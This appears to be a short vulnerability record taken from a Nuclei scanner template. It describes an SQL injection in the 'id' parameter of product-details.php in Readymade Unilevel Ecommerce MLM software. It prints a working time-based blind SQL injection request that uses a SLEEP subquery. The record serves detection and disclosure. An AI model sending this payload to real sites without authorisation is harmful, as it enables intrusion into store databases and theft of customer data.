# Vulnerability: Readymade Unilevel Ecommerce MLM - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`readymade-unilevel-sqli.yaml`)

## Description
Readymade Unilevel Ecommerce software has sql vulnerability in product-details.php?id

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout 30s
GET /product-details.php?id=1%20AND%20(SELECT%206812%20FROM%20(SELECT(SLEEP(6)))DddL) HTTP/1.1
Host: {{Hostname}}
```

